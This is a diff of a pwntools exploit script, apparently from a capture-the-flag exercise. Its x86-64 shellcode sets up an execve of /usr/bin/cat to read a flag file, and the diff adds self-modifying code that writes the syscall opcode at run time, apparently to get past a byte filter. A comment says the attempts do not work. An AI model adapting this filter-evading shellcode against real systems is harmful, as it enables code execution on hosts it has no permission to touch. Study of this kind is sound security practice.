@@ -7,6 +7,9 @@ context.arch = 'amd64'
 # 1 Stackframe is 8 bytes (64bit)
 
 shellcode=f"""
+syscall:
+nop
+nop
 push {u32(b"/cat")}                        /* Push "tac/" onto the stack (32bit/4byte) */
 push {u32(b"/usr")}                        /* Push rsu/ onto the stack (32bit/4byte) */
 mov dword ptr [rsp+4], {u32(b"/bin")}      /* moves nib/ to the remaining 4 bytes of the previous stackframe' */
@@ -25,8 +28,10 @@ push 0                                     /* push null byte onto stack */
 pop rdx                                    /* pop it into rdx */
 push 0x3b                                  /* push execve onto stack */                                 
 pop rax                                    /* pop it into rax */
-push 0x0f
-mov dword ptr [rsp+4], 0x05
+mov ecx, 0x1ad73000                        /* move address of syscall label to ecx */
+mov word ptr [ecx], 0x0f                   /* move second part of opcode of syscall to the address ecx points to */
+mov word ptr [ecx + 1], 0x05               /* move first part of opcode of syscall to the address ecx points to */
+jmp syscall                                /* jump to address where opcode got posted to */
 """
 # both not working, how to prevent 48 opcode in 64 bit mode? 
 #shellcode=pwnlib.shellcraft.i386.linux.cat("/flag")
